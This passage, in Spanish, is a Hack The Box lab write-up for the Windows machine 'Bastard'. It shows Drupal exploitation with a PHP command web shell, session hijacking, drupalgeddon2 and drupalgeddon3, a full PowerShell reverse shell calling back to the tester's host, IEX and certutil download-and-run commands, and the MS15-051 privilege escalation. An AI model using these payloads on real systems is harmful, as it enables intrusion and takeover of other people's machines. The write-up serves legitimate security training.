-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Este &lt;code&gt;exploit&lt;/code&gt; aprovecha una inyeccion &lt;code&gt;sql&lt;/code&gt; para obtener la cache del endpoint y credenciales de administrador en hash, para despues tratar de subir un archivo &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;# Initialization
-
-error_reporting(E_ALL);
-
-define('QID', 'anything');
-define('TYPE_PHP', 'application/vnd.php.serialized');
-define('TYPE_JSON', 'application/json');
-define('CONTROLLER', 'user');
-define('ACTION', 'login');
-
-$url = 'http://vmweb.lan/drupal-7.54';
-$endpoint_path = '/rest_endpoint';
-$endpoint = 'rest_endpoint';
-
-$file = [
-    'filename' =&amp;gt; 'dixuSOspsOUU.php',
-    'data' =&amp;gt; '&amp;lt;?php eval(file_get_contents(\'php://input\')); ?&amp;gt;'
-];
-
-$browser = new Browser($url . $endpoint_path);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para utulizar el &lt;code&gt;exploit&lt;/code&gt;, primero debemos cambiar ciertas variables que define el &lt;code&gt;exploit&lt;/code&gt; como la &lt;code&gt;url&lt;/code&gt; y el &lt;code&gt;endpoint_path&lt;/code&gt;. En este caso debemos verificar si &lt;code&gt;rest_endpoint&lt;/code&gt; existe.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que &lt;code&gt;rest_endpoint&lt;/code&gt; no existe asi que podemos tratar usar un poco de &lt;code&gt;guesing&lt;/code&gt; y probar la ruta &lt;code&gt;rest&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Efectivamente vemos que se cambio la ruta por defecto a &lt;code&gt;rest&lt;/code&gt;, claro que de no haber acertado de esta forma, podriamos realizar un ataque de fuerza bruta para descubrir esta ruta como una manera alterna de hacerlo.&lt;/p&gt;
-
-&lt;p&gt;Pues viendo que esta ruta si es valida tbm lo modificaremos en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Finalmente vamos a modificar el archivo que crea por defecto, y vamos a crear uno propio. Este codigo nos permitira ejecutar comandos en la maquina victima mediante el parametro &lt;code&gt;cmd&lt;/code&gt; a traves de la función &lt;code&gt;shell_exec&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
-    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El exploit procederia a quedarnos de la siguiente manera con los cambios realizados.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;# Initialization
-
-error_reporting(E_ALL);
-
-define('QID', 'anything');
-define('TYPE_PHP', 'application/vnd.php.serialized');
-define('TYPE_JSON', 'application/json');
-define('CONTROLLER', 'user');
-define('ACTION', 'login');
-
-$url = 'http://10.10.10.9';
-$endpoint_path = '/rest';
-$endpoint = 'rest_endpoint';
-
-$file = [
-    'filename' =&amp;gt; 'pwn.php',
-    'data' =&amp;gt; '&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST[\'cmd\']) . &quot;&amp;lt;/pre&amp;gt;&quot;; ?&amp;gt;'
-];
-
-$browser = new Browser($url . $endpoint_path);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora procedemos a ejecutar el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php drupal.php
-# Exploit Title: Drupal 7.x Services Module Remote Code Execution
-# Vendor Homepage: https://www.drupal.org/project/services
-# Exploit Author: Charles FOL
-# Contact: https://twitter.com/ambionics
-# Website: https://www.ambionics.io/blog/drupal-services-module-rce
-
-
-#!/usr/bin/php
-Stored session information in session.json
-Stored user information in user.json
-Cache contains 7 entries
-File written: http://10.10.10.9/pwn.php
-❯ ls
- drupal.php   session.json   user.json
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;VIsualizamos que el archivo nos lo sube en la ruta principal, lo siguiente sera validar el archivo subido.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo que ahora nos quedaria hacer, es enviarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina.&lt;/p&gt;
-
-&lt;p&gt;De manera alternativa para ganar acceso vimos que antes, al ejecutar el &lt;code&gt;exploit&lt;/code&gt;, nos creo un archivo &lt;code&gt;session.json&lt;/code&gt; que contiene la sesion de usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
-    &quot;session_name&quot;: &quot;SESSd873f26fc11f2b7e6e4aa0f6fce59913&quot;,
-    &quot;session_id&quot;: &quot;nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c&quot;,
-    &quot;token&quot;: &quot;F_Tzii9LQfqeF9ekHCP4qTIGp1VYlIU0fuG2LiIfwIA&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos cambiar nuestra &lt;code&gt;cookie&lt;/code&gt; de sesión de manera simple con la opción &lt;code&gt;inspeccionar&lt;/code&gt;, insertando el &lt;code&gt;session_name&lt;/code&gt; en el campo &lt;code&gt;nombre&lt;/code&gt; y el &lt;code&gt;session_id&lt;/code&gt; en &lt;code&gt;valor&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez insertados los campos recargamos la pagina y ya estariamos logeados como el usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora que somos el ususario &lt;code&gt;admin&lt;/code&gt;, podriamos dirigirnos a la opción &lt;code&gt;Modules&lt;/code&gt; y activar la opción de &lt;code&gt;PHP filter&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues agregamos un nuevo contenido en &lt;code&gt;content&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a la opción &lt;code&gt;articule&lt;/code&gt; y agregamos un nombre, en el cuerpo podemos ejecutar codigo &lt;code&gt;php&lt;/code&gt;. En este caso usare un codigo &lt;code&gt;reverse shell&lt;/code&gt; en &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Puedes usar este codigo, solo necesitas cambiar la &lt;code&gt;ip&lt;/code&gt; y &lt;code&gt;puerto&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php&quot;&gt;https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Establecemos en formato el de &lt;code&gt;PHP code&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos en escucha por el puerto que configuramos en el &lt;code&gt;codigo&lt;/code&gt; en mi caso en el puerto &lt;code&gt;443&lt;/code&gt;. Finalmente seleccionamos en la opción &lt;code&gt;Preview&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y habriamos ganado acceso como el usuario &lt;code&gt;iis apppool\drupal&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.9.
-Ncat: Connection from 10.10.10.9:49279.
-SOCKET: Shell has connected! PID: 2644
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\inetpub\drupal-7.54&amp;gt;whoami
-iis apppool\drupal
-
-C:\inetpub\drupal-7.54&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como segunda forma alternativa, podemos hacer uso del exploit &lt;code&gt;drupalgeddon2&lt;/code&gt;. Podemos encontrar el exploit usando &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit drupalgeddon2
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
-Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
-Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esta hecho en &lt;code&gt;ruby&lt;/code&gt; por lo que debemos tenerlo instalado para poder ejecutarlo. Lo que conseguiremos con este exploit es ganar acceso a la maquina victima mediante &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Como requisito lo mas probable es que te pida instalar la gema &lt;code&gt;highline&lt;/code&gt;, lo cual se realiza del siguiente modo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gem install highline
-Fetching highline-2.1.0.gem
-Successfully installed highline-2.1.0
-Parsing documentation for highline-2.1.0
-Installing ri documentation for highline-2.1.0
-Done installing documentation for highline after 2 seconds
-1 gem installed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez instalada podemos ejecutar el exploit correctamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ruby drupalgeddon.rb
-Usage: ruby drupalggedon2.rb &amp;lt;target&amp;gt; [--authentication] [--verbose]
-Example for target that does not require authentication:
-       ruby drupalgeddon2.rb https://example.com
-Example for target that does require authentication:
-       ruby drupalgeddon2.rb https://example.com --authentication
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo unico que le necesitamos proporcionar es el target en este caso la ip de la maquina victima.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ruby drupalgeddon.rb http://10.10.10.9
-[*] --==[::#Drupalggedon2::]==--
---------------------------------------------------------------------------------
-[i] Target : http://10.10.10.9/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La herramienta te automatiza el proceso para ganar acceso como el usuario &lt;code&gt;nt authority\iusr&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[*] Dropping back to direct OS commands
-drupalgeddon2&amp;gt;&amp;gt; whoami
-nt authority\iusr
-drupalgeddon2&amp;gt;&amp;gt; ipconfig
-Windows IP Configuration
-
-
-Ethernet adapter Local Area Connection:
-
-   Connection-specific DNS Suffix  . : 
-   IPv4 Address. . . . . . . . . . . : 10.10.10.9
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 10.10.10.2
-
-Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Tunnel adapter Local Area Connection* 9:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . :
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como tercera alternativa, tenemos el &lt;code&gt;drupalgeddon3&lt;/code&gt;, del repositorio de:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/oways/SA-CORE-2018-004&quot;&gt;https://github.com/oways/SA-CORE-2018-004&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Nos clonamos el respositorio y tenemos un script hecho el &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/oways/SA-CORE-2018-004
-Clonando en 'SA-CORE-2018-004'...
-remote: Enumerating objects: 15, done.
-remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15
-Recibiendo objetos: 100% (15/15), 106.84 KiB | 475.00 KiB/s, listo.
-Resolviendo deltas: 100% (2/2), listo.
-❯ cd SA-CORE-2018-004
-❯ ls
- drupalgeddon3.py   example.png   README.md
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 drupalgeddon3.py
-
-[Usage]
-python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]
-
-[Example]
-python drupalgeddon3.py http://target/drupal/ &quot;SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0&quot; 6 &quot;uname -a&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al ejecutarlo nos pide el &lt;code&gt;target&lt;/code&gt; y la &lt;code&gt;session&lt;/code&gt; que habriamos obtenido anteriormente con el primer &lt;code&gt;exploit&lt;/code&gt;, seguidamente nos pide un &lt;code&gt;nodo&lt;/code&gt; existente que lo podemos ver en la opción &lt;code&gt;content &amp;gt; find content&lt;/code&gt; y en &lt;code&gt;REST&lt;/code&gt; haciendo &lt;code&gt;hovering (pasar el mouse encima de la opción)&lt;/code&gt; vemos el numero de &lt;code&gt;nodo&lt;/code&gt; y finalmente el comando que queremos ejecutar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 drupalgeddon3.py http://10.10.10.9 &quot;SESSd873f26fc11f2b7e6e4aa0f6fce59913=nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c&quot; 1 &quot;whoami&quot;
-nt authority\iusr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El exploit funciona correctamente y esta seria la tercera forma de ganar acceso al sistema.&lt;/p&gt;
-
-&lt;p&gt;Para ganar al sistema de manera mas comoda usare el primer metodo, para usando la herramienta &lt;code&gt;nishang&lt;/code&gt; y obtener acceso en una &lt;code&gt;powershell&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para matar dos pajaros de un tiro, como es de costumbre añadiremos al final del &lt;code&gt;script&lt;/code&gt; la ejecución del comando que nos otorgue la conexión una vez este se interprete.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function Invoke-PowerShellTcp 
-{ 
-    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(
-
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
-        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
-        [String]
-        $IPAddress,
-
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
-        [Int]
-        $Port,
-
-        [Parameter(ParameterSetName=&quot;reverse&quot;)]
-        [Switch]
-        $Reverse,
-
-        [Parameter(ParameterSetName=&quot;bind&quot;)]
-        [Switch]
-        $Bind
-
-    )
-
-    
-    try 
-    {
-        #Connect back if the reverse switch is used.
-        if ($Reverse)
-        {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
-        }
-
-        #Bind to the provided port if Bind switch is used.
-        if ($Bind)
-        {
-            $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
-            $client = $listener.AcceptTcpClient()
-        } 
-
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
-
-        #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        #Show an interactive PowerShell prompt
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
-            {
-                #Execute the command on the target.
-                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
-            }
-            catch
-            {
-                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
-
-            #Return the results
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
-    }
-    catch
-    {
-        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
-        Write-Error $_
-    }
-}
-
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos compartimos ahora un servicio web con &lt;code&gt;python&lt;/code&gt; y nos ponemos en escucha por el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el script mediante el archivo &lt;code&gt;pwn.php&lt;/code&gt; que subimos previamente y elecutamos &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; con &lt;code&gt;IEX&lt;/code&gt; para que se nos interprete.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Recibimos la petición&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.9 - - [29/Apr/2023 03:34:16] &quot;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y ganamos acceso en una &lt;code&gt;powershell&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.9.
-Ncat: Connection from 10.10.10.9:49349.
-Windows PowerShell running as user BASTARD$ on BASTARD
-Copyright (C) 2015 Microsoft Corporation. All rights reserved.
-
-PS C:\inetpub\drupal-7.54&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos dirigimos al directorio del usuario &lt;code&gt;dimitris&lt;/code&gt; y visiualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd Desktop
-dir
-
-
-    Directory: C:\Users\dimitris\Desktop
-
-
-Mode                LastWriteTime     Length Name                              
-----                -------------     ------ ----                              
--a---         19/3/2017   8:06 ??         32 user.txt                          
-
-
-type user.txt
-ba22fde1932d06eb76a163d312f921a2
-PS C:\Users\dimitris\Desktop&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Logramos obtener unas contraseñas en texto claro.&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Usaremos &lt;code&gt;sherlock.ps1&lt;/code&gt; para detectar vias potenciales de escalar privilegios en el &lt;code&gt;kernel&lt;/code&gt;. esta herramienta realiza un proceso similar a herramientas como &lt;code&gt;powerview&lt;/code&gt; y &lt;code&gt;winpeas&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&quot;&gt;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Una vez tengamos el &lt;code&gt;script&lt;/code&gt; si filtramos por &lt;code&gt;function&lt;/code&gt;. podemos ver distintas opciones que podemos probar.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat Sherlock.ps1 | grep &quot;function&quot;
-function Get-FileVersionInfo ($FilePath) {
-function Get-InstalledSoftware($SoftwareName) {
-function Get-Architecture {
-function Get-CPUCoreCount {
-function New-ExploitTable {
-function Set-ExploitTable ($MSBulletin, $VulnStatus) {
-function Get-Results {
-function Find-AllVulns {
-function Find-MS10015 {
-function Find-MS10092 {
-function Find-MS13053 {
-function Find-MS13081 {
-function Find-MS14058 {
-function Find-MS15051 {
-function Find-MS15078 {
-function Find-MS16016 {
-function Find-MS16032 {
-function Find-MS16034 {
-function Find-CVE20177199 {
-function Find-MS16135 {
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Usaremos la opción &lt;code&gt;Find-AllVulns&lt;/code&gt; que me probara todas las opciones. Para ello debemos abrirnos el &lt;code&gt;script&lt;/code&gt; y en la linea final agregar &lt;code&gt;Find-AllVulns&lt;/code&gt;, que hara que al interpretarse el codigo al final llame a esa función.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;        $Build = [int]$VersionInfo[2]
-        $Revision = [int]$VersionInfo[3].Split(&quot; &quot;)[0]
-
-        switch ( $Build ) {
-
-            7601 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -lt 23584 ] }
-            9600 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 18524 ] }
-            10240 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 16384 ] }
-            10586 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 19 ] }
-            14393 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 446 ] }
-            default { $VulnStatus = &quot;Not Vulnerable&quot; }
-
-        }
-
-    Set-ExploitTable $MSBulletin $VulnStatus
-
-}
-
-Find-AllVulns
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Compartimos un servicio web con &lt;code&gt;python&lt;/code&gt; nuevamente y interpretamos el script desde la maquina victima con &lt;code&gt;IEX&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;Iex(New-Object Net.WebClient).downloadString('http://10.10.16.3/Sherlock.ps1')
-
-Title      : User Mode to Ring (KiTrap0D)
-MSBulletin : MS10-015
-CVEID      : 2010-0232
-Link       : https://www.exploit-db.com/exploits/11199/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : Task Scheduler .XML
-MSBulletin : MS10-092
-CVEID      : 2010-3338, 2010-3888
-Link       : https://www.exploit-db.com/exploits/19930/
-VulnStatus : Appears Vulnerable
-
-Title      : NTUserMessageCall Win32k Kernel Pool Overflow
-MSBulletin : MS13-053
-CVEID      : 2013-1300
-Link       : https://www.exploit-db.com/exploits/33213/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : TrackPopupMenuEx Win32k NULL Page
-MSBulletin : MS13-081
-CVEID      : 2013-3881
-Link       : https://www.exploit-db.com/exploits/31576/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : TrackPopupMenu Win32k Null Pointer Dereference
-MSBulletin : MS14-058
-CVEID      : 2014-4113
-Link       : https://www.exploit-db.com/exploits/35101/
-VulnStatus : Not Vulnerable
-
-Title      : ClientCopyImage Win32k
-MSBulletin : MS15-051
-CVEID      : 2015-1701, 2015-2433
-Link       : https://www.exploit-db.com/exploits/37367/
-VulnStatus : Appears Vulnerable
-
-Title      : Font Driver Buffer Overflow
-MSBulletin : MS15-078
-CVEID      : 2015-2426, 2015-2433
-Link       : https://www.exploit-db.com/exploits/38222/
-VulnStatus : Not Vulnerable
-
-Title      : 'mrxdav.sys' WebDAV
-MSBulletin : MS16-016
-CVEID      : 2016-0051
-Link       : https://www.exploit-db.com/exploits/40085/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : Secondary Logon Handle
-MSBulletin : MS16-032
-CVEID      : 2016-0099
-Link       : https://www.exploit-db.com/exploits/39719/
-VulnStatus : Appears Vulnerable
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que parece ser vulnerable a &lt;code&gt;MS15-051&lt;/code&gt; y para explotarlo usaremos un repositorio en github, del cual podemos descargarnos un archivo &lt;code&gt;zip&lt;/code&gt; que contiene el ejecutable.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051&quot;&gt;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- Source   ms15-051.exe   ms15-051x64.exe
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Procedemos a subirlo a la maquina victima, para ello usaremos &lt;code&gt;certutil&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.3/ms15-051x64.exe ms15-051x64.exe
-****  Online  ****
-  0000  ...
-  d800
-CertUtil: -URLCache command completed successfully.
-
-dir
-
-    Directory: C:\WIndows\Temp\Priv
-
-
-Mode                LastWriteTime     Length Name                              
-----                -------------     ------ ----                              
--a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para ejecutarlo, simplemte debemos pasarle un comando.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\ms15-051x64.exe &quot;whoami&quot;
